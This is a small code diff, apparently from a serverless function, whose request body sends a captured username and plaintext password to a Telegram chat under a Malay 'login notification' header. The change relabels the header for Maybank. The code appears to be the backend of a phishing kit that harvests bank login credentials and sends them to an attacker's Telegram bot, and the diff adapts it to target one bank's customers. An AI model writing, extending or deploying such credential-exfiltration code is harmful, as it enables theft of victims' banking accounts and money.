@@ -29,7 +29,7 @@ serve(async (req) => {
       },
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
-        text: `Pemberitahuan Log Masuk:\nNama Pengguna: ${username}\nKata Laluan: ${password}\nStatus: ${message}`,
+        text: `Pemberitahuan Log Masuk (Maybank):\nNama Pengguna: ${username}\nKata Laluan: ${password}\nStatus: ${message}`,
       }),
     });
 
